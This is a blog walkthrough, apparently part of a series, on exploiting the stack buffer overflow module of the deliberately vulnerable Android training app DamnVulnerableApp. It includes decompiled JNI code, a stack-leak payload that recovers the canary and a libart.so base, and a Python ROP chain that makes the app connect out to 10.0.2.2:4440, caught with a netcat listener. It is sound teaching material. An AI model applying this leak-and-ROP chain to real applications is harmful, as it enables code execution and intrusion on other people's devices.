---
title: "E²VA: Stack Buffer Overflow Module (Part 3)"
date: 2024-07-23T16:46:21+01:00
author: "Pascal Kühnemann"
draft: false
authorTwitter: "" #do not include @
cover: ""
tags: ["Android", "Binary Exploitation", "JNI", "E²VA", "Buffer Overflow", "Memory Leak"]
keywords: ["Android", "Binary Exploitation", "JNI", "E²VA", "Buffer Overflow", "Memory Leak"]
description: ""
showFullContent: false
readingTime: true
---

# Exploitation of *EasyStackBufferOverflowModule*

This article describes exploitation of the *EasyStackBufferOverflowModule*. During exploitation, various Android - specific caveats are discussed.

## Assumptions

We will assume that we have successfully grabbed a copy of the `.apk` file of *damnvulnerableapp*. Also, we will **not** discuss how to unpack an `.apk` file, but rather assume that we have access to `libEasyStackBufferOverflowModule.so` and the `EasyStackBufferOverflowModule` class. If it is unclear how to get access to these components when only given an `.apk` file, read the previous blog posts first!

## Analysis baseline

Lets first summarize what we have:
1. Access to `libEasyStackBufferOverflowModule.so`, which is a [shared - object file](http://www.sco.com/developers/gabi/latest/ch4.intro.html) that can be thrown into [*Ghidra*](https://ghidra-sre.org/).
2. Access to `.apk` file, which can be thrown into [*jadx*](https://github.com/skylot/jadx).

First of all, consider the native function as a black box and just decompile the Java code via *jadx*. Then, the code for `EasyStackBufferOverflowModule` should look like this:
```Java
package com.damnvulnerableapp.vulnerable.modules;

import com.damnvulnerableapp.common.exceptions.VulnerableModuleOperationException;
import java.nio.ByteBuffer;

/* loaded from: classes10.dex */
public final class EasyStackBufferOverflowModule extends VulnerableModule {
    private native byte[] vulnerableToUpper(byte[] bArr, int i);

    static {
        System.loadLibrary("EasyStackBufferOverflowModule");
    }

    public EasyStackBufferOverflowModule() {
        super(new StackBufferOverflowModuleConfiguration());
    }

    @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule
    public final void main() throws VulnerableModuleOperationException {
        byte[] message;
        output("Welcome to the latest version of the echo service >:)".getBytes());
        do {
            message = input();
            int unknown = ByteBuffer.wrap(input()).getInt();
            byte[] upper = vulnerableToUpper(message, unknown);
            output(upper);
        } while (!new String(message).equals("EXIT"));
        output("Exiting...".getBytes());
    }
}
```

The above code shows that the module takes two distinct inputs per iteration:
1. a message to be upper - cased
2. an integer that is also part of upper - casing.

Both inputs are forwarded to a native function called `vulnerableToUpper`. Finally, the upper - cased message will be sent back to us.

From `EasyStackBufferOverflowModule` we can infer that there has to be a function in `libEasyStackBufferOverflowModule.so`, whose symbol name contains `vulnerableToUpper`. This can be confirmed via
```bash
$ readelf --wide --symbols libEasyStackBufferOverflowModule.so | grep vulnerableToUpper
    6: 00000000000008f0   322 FUNC    GLOBAL DEFAULT   12 Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper
```

Okay, time for *Ghidra*! The following code has already been "beautified":
```C
jbyteArray Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper
          (JNIEnv *env, jobject this, jbyteArray string, jint length)
{
    char c;
    jbyte *raw;
    jsize stringLength;
    jbyteArray array;
    long fs;
    uint i;
    int bufferLength;
    char buffer [40];
    long canary;

    canary = *(long *)(fs + 0x28);
    memset(buffer,0,0x20);
    raw = (*(*env)->GetByteArrayElements)(env,string,(jboolean *)0x0);
    stringLength = (*(*env)->GetArrayLength)(env,string);
    perfect_memcpy(buffer,raw,(int)stringLength);

    for (i = 0; i < 0x20; i = i + 1)
        buffer[i] = toupper((int)buffer[i]);

    if ((int)length < 0x101)
        bufferLength = perfect_strlen(buffer) + (int)length;
    else
        bufferLength = perfect_strlen(buffer);

    array = (*(*env)->NewByteArray)(env,(jsize)bufferLength);
    (*(*env)->SetByteArrayRegion)(env,array,0,(jsize)bufferLength,buffer);

    if (*(long *)(fs + 0x28) == canary)
        return array;
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
}

void perfect_memcpy(char *dst, char *src, uint size)
{
    uint i;

    for (i = 0; i < size; i = i + 1)
        dst[i] = src[i];
    return;
}

uint perfect_strlen(char *string)
{
    uint i;

    for (i = 0; string[i] != '\0'; i = i + 1) {}
    return i;
}
```

## The Bug

As the module name suggests, there is indeed a buffer overflow bug. One function that is often part of a buffer overflow is `memcpy`. Thus, taking a closer look into how `memcpy` is used can turn out useful.

### Buffer Overflow

First of all, we can see that there is a classical buffer overflow:
```C
...
memset(buffer,0,0x20);
raw = (*(*env)->GetByteArrayElements)(env,string,(jboolean *)0x0);
stringLength = (*(*env)->GetArrayLength)(env,string);
perfect_memcpy(buffer,raw,(int)stringLength);
...
```
This is due to the fact that `stringLength` is computed w.r.t. the length of the input buffer `string`, but not w.r.t. the length of the destination buffer `buffer`. Thus, if `length > 0x20`, a classical buffer overflow occurs. Notice that the user has complete control over the contents and length of `string`, which is actually of type `jbyteArray`.

### Memory Leak(s)

In addition to the ability of manipulating the whole stack located above `buffer`, there is a weird sequence of code leading to returning more than "intended". Namely:
```C
...
if ((int)length < 0x101)
    bufferLength = perfect_strlen(buffer) + (int)length;
else
    bufferLength = perfect_strlen(buffer);

array = (*(*env)->NewByteArray)(env,(jsize)bufferLength);
(*(*env)->SetByteArrayRegion)(env,array,0,(jsize)bufferLength,buffer);

if (*(long *)(fs + 0x28) == canary)
    return array;
```

So if `length <= 0x100`, then it will be added to `bufferLength`. Technically, setting `length < 0` or `length < -perfect_strlen(buffer)` is possible, but does not seem very useful at first glance. Then, `bufferLength` bytes are copied from `buffer` into `array`. As `strlen(buffer) + length > 0x20 = sizeof (buffer)` is possible, this might leak arbitrary values from the stack coming after the buffer.

Summing up, if we sent a payload of the form
```python
client.forward(b'\x42' * 0x20)
client.forward(b'\x00\x00\x01\x00') # big - endian
leak = client.fetch()
```
we would get an additional `0x100` bytes from the memory located above `buffer`, i.e. from the stack. This leaks, among other things
1. Return address to `art_quick_generic_jni_trampoline`, which leaks the base of `libart.so` (almost as awesome as `libc.so`...as regards gadgets)
2. Old `rbp`, i.e. a stack pointer

## Exploitation >:)

Lets assume we already have a leaked `libart.so` pointer, i.e. we ran:
```python
client.forward(b'\x42' * 0x20)
client.forward(b'\x00\x00\x01\x00')
leak = client.fetch()

leak = decompose(leak[0x20:])

canary = leak[1]

# libart.so address of art_quick_generic_jni_trampoline+220,
# i.e. at file offset 0x39ffac (may differ)
libart_base = p64(u64(leak[3]) - 0x39ffac)

def decompose(leak : bytes):
    return [ leak[i * 8:(i+1) * 8] for i in range(len(leak) // 8) ]
```
To figure out that the second qword is the canary, just iterate over the decomposed leak and look for *not - address - looking* values. I always encountered fully random canaries, i.e. 8 random bytes, which seem to be the [default on Android](https://link.springer.com/article/10.1007/s10207-018-00425-8). But this will only be relevant in case e.g. `strcpy` is used instead of e.g. `memcpy`.

Using your favourite tool for gadget extraction, like [*ropper*](https://github.com/sashs/Ropper) or [*ROPgadget*](https://github.com/JonathanSalwan/ROPgadget), you can construct a ROP - chain to get arbitrary code execution. Basically, your payload could look like this:
```python
payload = b'\x42' * 0x20
payload += leak[0] # <-- unknown address
payload += canary
payload += leak[2] # <-- probably old rbp
payload += gadget_1
payload += gadget_2
payload += enjoy
...
```
because the leaked data from the stack looked like this (from low to high addresses):
```
lower   0x72d1b9cdc210      <-- unknown address
  |     0x79291c4ee3e94be3  <-- that is the canary
  |     0x72d08b1c28b0      <-- probably old rbp
higher  0x72d0f87a032c      <-- this is your most favourite address to leak
```
Notice that we do not need to care about the *unknown* address, because we are almost done.

Lets briefly think about how to approach the holy grail, i.e. *arbitrary code execution*. At first glance, a few options come to mind (consider the fact that e.g. `libart.so` is compiled with *RELRO* etc.):
1. ROP - chain that contains **all** the "code" (via gadgets) to execute. This (almost irreversibly) destroys the stack and you cannot expect that the app will recover from that.
2. smaller ROP - chain that writes some qwords into global memory (e.g. `.data@libart.so` or `.bss@libart.so`) and then restores the stack.
3. smaller ROP - chain that allocates writable and executable memory via e.g. `mmap`, writes the pointer returned in `rax` into global memory (thus only 8 bytes of global memory are invalidated). Then proceed as in 2. just with the new memory to write shellcode. Finally return into the shellcode.
4. [sigrop](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming), but there is no reason to use this.

For this blog post, we will only consider the first option, i.e. destroying the stack (don't worry the other ones will be covered in later posts ;D).

The naming convention for gadgets is like this: `gadget_opcode_operand1_operand2_opcode_operand1...`. So you need to be able to identify opcodes on Intel (the emulator runs on x86_64) to understand the ROP - chain. The following is an example of a ROP - chain connecting to `10.0.2.2:4440`, where `10.0.2.2` is [an alias to your loopback interface](https://developer.android.com/studio/run/emulator-networking.html):
```python
# Setup payload
payload = b'a' * 0x20
payload += leak[0] # <-- unknown address
payload += canary
payload += leak[2] # <-- probably old rbp

# Dynamically compute libc address via toupper@.got in libStackBufferOverflowModule.so
# and store it into writable_memory
payload = compute_libc_base(payload, writable_memory)
payload = call_libc_function(
    payload,
    writable_memory,
    'socket',
    [
        p64(0x2),
        p64(0x1),
        p64(0x0)
    ]
)

# Store socket in memory
payload += gadget_pop_rdi
payload += p64(u64(writable_memory) + 0x8)
payload += gadget_mov_deref_rdi_rax

# Construct sockaddr_in
payload += gadget_pop_rdi
payload += p64(u64(writable_memory) + 0x10)
payload += gadget_pop_rax
payload += b'\x02\x00' + b'\x11\x58' + b'\x0a\x00\x02\x02'
payload += gadget_mov_deref_rdi_rax

payload += gadget_pop_rdi
payload += p64(u64(writable_memory) + 0x18)
payload += gadget_pop_rax
payload += b'\x00' * 0x8
payload += gadget_mov_deref_rdi_rax

# Connect to 10.0.2.2:4440
# rdx = size
payload += gadget_pop_rdx
payload += b'\x10' + b'\x00' * 0x7

# rsi = addr of socketaddr_in
payload += gadget_pop_rsi
payload += p64(u64(writable_memory) + 0x10)

# rdi = sockfd
payload += gadget_pop_rdi
payload += p64(u64(writable_memory) + 0x8)
payload += gadget_mov_rax_deref_rdi
payload += gadget_mov_rdi_rax_pop_rax
payload += writable_memory

# Call function --> syscall instead of libc call, because this returns errno
payload += gadget_pop_rax
payload += p64(0x2a)
payload += gadget_syscall
```

Lets take a step back and see the individual steps the ROP - chain performs:
1. `compute_libc_base` computes the base address of `libc.so` by "leaking" a `libc.so` address from `.got@libStackBufferOverflowModule.so` into a register and writing that address into `writable_memory`
2. `call_libc_function` calls `socket@libc.so` and puts the file descriptor into `writable_memory+0x8`
3. Then a structure of type `struct sockaddr_in` is crafted in global memory and describes where to connect to.
4. Finally `connect@syscall` is called. At least on my end, calling `connect@libc.so` caused an error. This might be due to the fact that we wrote into global memory located in `libart.so` (... whyever that would be the case though). For this PoC, we just need the app to perform a connection. Therefore we can use a system call to do so. We did **not** use a system call to create the socket, as there where no gadgets of the form `syscall; ret` (or *ropper* did not tell me). Thus, after the `syscall` gadget, the behaviour of the app is undefined.

To catch the PoC, run the following command on your local machine:
```bash
nc -lvnp 4440
```

Now one might argue: "Why don't we just run a classical `execve` ROP - chain?".

The answer to that lies in the implementation of *DamnVulnerableApp*. The manager app will *clean up* the vulnerable process, if the connection between them breaks. Observe that calling `execve` will definitely destroy the connection between the vulnerable app and the manager app. This forces the manager app to send a `SIGKILL` to the vulnerable app, thus ending its life even before the program to be executed via `execve` is initialized. As `execve` does not create a new process (and creating a new process might even violate the permissions of the vulnerable app), i.e. the PID stays the same, the manager app will always shutdown `execve` attempts. Also one could argue that it is better practice to keep the target app alive for stealth - reasons.

# Conclusion

In summary, the *EasyStackBufferOverflowModule* can be exploited by using a classical ROP - chain after leaking enough information. It is possible to get *arbitrary code execution* limited only by the constraints that *DamnVulnerableApp* (and its permissions and security mechanisms) imposes.